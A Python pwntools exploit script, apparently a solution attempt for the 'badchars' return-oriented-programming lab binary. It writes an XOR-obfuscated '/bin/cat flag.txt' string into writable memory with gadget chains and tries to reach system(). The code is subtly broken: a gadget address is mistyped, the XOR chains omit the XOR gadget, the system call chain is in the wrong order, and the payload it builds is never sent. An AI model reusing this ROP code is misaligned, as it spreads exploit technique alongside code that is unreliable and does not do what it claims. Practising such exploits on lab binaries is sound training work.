#!/usr/bin/env python3

from pwn import *

'''
BAD BYTES
0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73
'''

#ALWAYS DEBUG!
context.log_level='DEBUG'
context(terminal=['tmux','new-window'],os='linux',arch='amd64')
#p = gdb.debug('./badchars','b main')
p = process('./badchars')

junk = ("A"* 40).encode()
#String Argument
#/bin/cat flag.txt xor D = k&-*k'%0d"(%#j0<0
bin_cat = "k&-*k'%0".encode()
flag_txt = 'd"(%#j0<'.encode()
last_bit = "0".ljust(8,"\x00").encode()

#Stage 1 load string into memory @ 0x00601070
#0x0000000000400b3b: pop r12; pop r13; ret;
#0x0000000000400b34: mov qword ptr [r13], r12; ret;
data_start = 0x00601070
pop_r12_r13 = p64(0x400b3b)
mov_r13_r12 = p64(0x400b34)
load_str_1 = pop_r12_r13 + bin_cat + p64(data_start) + mov_r13_r12
load_str_2 = pop_r12_r13 + flag_txt + p64(data_start+0x8) + mov_r13_r12
load_str_3 = pop_r12_r13 + last_bit + p64(data_start+0x10) + mov_r13_r12
load_str = load_str_1 + load_str_2 + load_str_3

#Stage 2 modify string in memory @ 0x00601070
#0x0000000000400b40: pop r14; pop r15; ret;
#0x0000000000400b30: xor byte ptr [r15], r14b; ret;
key = "D".ljust(8,"\x00").encode()
pop_r14_r15 = p64(0x400b40)
xor_r15_r14b = p64(0x400b300)

xor_str_1 = pop_r14_r15 + key + p64(data_start)
xor_str_2 = pop_r14_r15 + key + p64(data_start+0x8)
xor_str_3 = pop_r14_r15 + key + p64(data_start+0x10)
xor_str = xor_str_1 + xor_str_2 + xor_str_3

#Stage 3 call system with string's memory location
#0x0000000000400b39: pop rdi; ret;
system = p64(0x4009e8)
pop_rdi = p64(0x400b39)
system_call = system + pop_rdi + p64(data_start)

payload = load_str + xor_str + system_call
print(len(payload))

p.recvuntil('>')
p.sendline(junk)
p.interactive()
#flag = p.recvline()
#log.success("Flag: "+flag.decode('ascii'))
